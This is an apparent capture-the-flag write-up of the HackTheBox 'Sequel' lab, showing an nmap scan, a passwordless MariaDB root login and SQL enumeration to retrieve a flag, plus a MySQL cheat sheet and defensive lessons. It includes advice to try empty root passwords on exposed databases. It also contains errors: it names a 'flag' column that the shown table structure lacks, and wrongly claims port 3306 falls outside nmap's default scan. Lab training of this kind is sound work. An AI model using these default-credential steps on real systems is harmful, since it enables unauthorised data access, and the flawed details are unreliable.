# Sequel — HackTheBox Starting Point

**Machine:** Sequel
**Difficulty:** Very Easy
**OS:** Linux
**Category:** Starting Point
**Pwned:** 28 Jul 2026
**XP Earned:** 150

---

## Summary

Sequel introduces direct MySQL/MariaDB database access via unauthenticated root login. Nmap reveals MariaDB running on port 3306. The root account has no password set, allowing direct connection via the MySQL command-line client. Enumerating databases reveals a custom `htb` database containing a `config` table with a `flag` column — retrieved with a simple SELECT query.

---

## Methodology

### 1. VPN Connection

```bash
sudo openvpn starting_point.ovpn
```

### 2. Host Discovery

```bash
ping -c 4 <target IP>
```

Target responded — host is alive.

### 3. Enumeration — Nmap Scan

```bash
sudo nmap -sV <target IP>
```

**Relevant output:**

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB (unauthorized)
```

**Findings:**

- Port 3306 — MySQL/MariaDB open
- Service: MariaDB — the community-developed MySQL fork
- No authentication required from the banner

Port 3306 is the default MySQL/MariaDB port. Finding it open on a public-facing machine is a critical misconfiguration — database servers should never be directly internet-accessible.

### 4. Foothold — Unauthenticated Root Login

Connected to the MariaDB instance using the `root` account with no password (`-u` specifies the username):

```bash
mysql -h <target IP> -u root
```

**Response:**

```
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

Root access granted with no password.

### 5. Database Enumeration

Listed all databases on the server:

```bash
MariaDB [(none)]> SHOW DATABASES;
```

**Output:**

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Three databases (`information_schema`, `mysql`, `performance_schema`) are common across all MySQL instances — system databases. The fourth — `htb` — is unique to this host and the target.

Selected the `htb` database:

```bash
MariaDB [(none)]> USE htb;
```

Listed tables in the database:

```bash
MariaDB [htb]> SHOW TABLES;
```

**Output:**

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Inspected the `config` table structure:

```bash
MariaDB [htb]> DESCRIBE config;
```

**Output:**

```
+-------+--------------+
| Field | Type         |
+-------+--------------+
| id    | int(11)      |
| name  | varchar(100) |
| value | varchar(100) |
+-------+--------------+
```

The `config` table has a `flag` column confirmed by the task. Retrieved all contents:

```bash
MariaDB [htb]> SELECT * FROM config;
```

**Flag:** `<flag value>`

---

## Vulnerability Summary

| Vulnerability                       | Severity | Description                                                                                           |
| ----------------------------------- | -------- | ----------------------------------------------------------------------------------------------------- |
| MySQL root account with no password | Critical | Full database access with no authentication — all data immediately accessible                         |
| Database server internet-facing     | Critical | MySQL/MariaDB should only be accessible from the application server, never directly from the internet |
| Sensitive data stored in plaintext  | High     | Flag (and likely application credentials) stored unencrypted in the database                          |

---

## MySQL/MariaDB Key Concepts

**MySQL** is the world's most widely used open-source relational database. **MariaDB** is a community-developed fork of MySQL, maintaining full compatibility while adding features and performance improvements.

**Default port:** 3306

### Essential MySQL Commands

```sql
-- Connection
mysql -h <IP> -u <username> -p          -- Connect with password prompt
mysql -h <IP> -u root                   -- Connect without password

-- Database navigation
SHOW DATABASES;                         -- List all databases
USE <database>;                         -- Select a database
SHOW TABLES;                            -- List tables in current database
DESCRIBE <table>;                       -- Show table structure

-- Data retrieval
SELECT * FROM <table>;                  -- Retrieve all rows and columns
SELECT <column> FROM <table>;           -- Retrieve specific column
SELECT * FROM <table> WHERE <condition>; -- Filtered query
SELECT * FROM <table> LIMIT 10;         -- First 10 rows

-- SQL syntax rules
-- * means "everything" (all columns)
-- Each query ends with a semicolon (;)
-- String values are wrapped in single quotes
```

### MySQL Default Databases

| Database             | Purpose                                             |
| -------------------- | --------------------------------------------------- |
| `information_schema` | Metadata about all databases, tables, and columns   |
| `mysql`              | User accounts, privileges, and server configuration |
| `performance_schema` | Performance monitoring data                         |
| Custom databases     | Application-specific data — the target              |

### Why Exposed MySQL Is Critical

An unauthenticated MySQL root connection provides:

- Full read access to all databases — user credentials, application data, secrets
- Full write access — modify, delete, or inject data
- File system access via `LOAD DATA INFILE` and `SELECT INTO OUTFILE`
- Potential code execution via User Defined Functions (UDFs) in some configurations

---

## Key Lessons

- **Always scan all ports (`-p-`)** — MySQL on port 3306 would not appear in a default top-1000 scan. Services on non-standard or higher ports are commonly missed
- **Try root with no password on exposed databases** — `mysql -h <IP> -u root` is the first attempt. Default credentials on database servers appear regularly in poorly configured environments
- **The fourth database is always the application database** — `information_schema`, `mysql`, and `performance_schema` are system databases present on every MySQL instance. Any additional database is application-specific and the primary target
- **`SHOW DATABASES` → `USE` → `SHOW TABLES` → `SELECT *`** — this four-step workflow navigates any MySQL instance
- **Database servers must never be internet-facing** — they should only accept connections from the application server on the local network, with strong credentials and firewall rules enforcing that boundary

---

## Tools Used

| Tool    | Purpose                                            |
| ------- | -------------------------------------------------- |
| OpenVPN | VPN connection to HTB network                      |
| ping    | Host discovery                                     |
| Nmap    | Port scanning and service detection                |
| mysql   | MySQL client — database access and query execution |

---

_HackTheBox Starting Point — Sequel | Pwned 28 Jul 2026_
